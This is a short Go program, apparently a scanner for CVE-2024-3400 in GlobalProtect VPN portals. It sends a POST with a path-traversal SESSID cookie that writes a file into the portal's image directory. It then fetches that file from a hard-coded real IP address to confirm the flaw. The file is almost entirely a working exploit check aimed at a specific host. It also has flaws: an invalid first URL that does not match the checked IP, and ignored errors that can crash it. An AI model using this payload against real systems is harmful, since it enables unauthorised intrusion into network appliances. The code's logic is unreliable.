package test

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"strings"
)

func Test() {
	url := "http://345.com"
	payload := ""
	headers := map[string]string{
		"Cookie":         "SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/ycxlo1.txt;",
		"Content-Length": "0",
		"Content-Type":   "application/x-www-form-urlencoded",
		"Connection":     "close",
	}

	// 创建自定义的 Transport(禁用SSL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{Transport: tr}
	req, err := http.NewRequest("POST", url, strings.NewReader(payload))
	if err != nil {
		fmt.Println("Error creating request:", err)
	}

	for key, value := range headers {
		req.Header.Set(key, value)
	}

	response, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
	}

	req2, err := http.NewRequest("GET", "https://61.177.43.26/global-protect/portal/images/ycxlo1.txt", nil)
	if err != nil {

	}
	response2, err := client.Do(req2)

	if response2.StatusCode == http.StatusForbidden && response.StatusCode == http.StatusOK {
		fmt.Println("[*]CVE-2024-3400 : " + url)
	}

	defer response2.Body.Close()
}
